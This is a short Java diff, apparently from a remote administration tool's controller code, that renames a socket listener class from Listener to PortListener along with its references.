@@ -9,9 +9,9 @@ import com.redpois0n.Slave;
 import com.redpois0n.ui.panels.PanelMainSockets;
 
 
-public class Listener implements Runnable {
+public class PortListener implements Runnable {
 
-	public static List<Listener> servers = new ArrayList<Listener>();
+	public static List<PortListener> servers = new ArrayList<PortListener>();
 	
 	private ServerSocket server;
 	private int timeout = 15 * 1000;
@@ -44,7 +44,7 @@ public class Listener implements Runnable {
 		return name;
 	}
 	
-	public Listener(String name, int port, int timeout, String key, String pass) throws Exception {
+	public PortListener(String name, int port, int timeout, String key, String pass) throws Exception {
 		this.name = name;
 		this.timeout = timeout;
 		this.server = new ServerSocket(port);
@@ -72,9 +72,9 @@ public class Listener implements Runnable {
 		new Thread(this, "Port " + server.getLocalPort()).start();
 	}
 
-	public static Listener getConnection(String name, int port, int timeout, String key, String pass) {
+	public static PortListener getConnection(String name, int port, int timeout, String key, String pass) {
 		for (int i = 0; i < servers.size(); i++) {
-			Listener con = servers.get(i);
+			PortListener con = servers.get(i);
 			if (con.name.equals(name) && con.key.equals(key) && con.pass.equals(pass) && con.getServer().getLocalPort() == port && con.getTimeout() == timeout) {
 				return con;
 			}
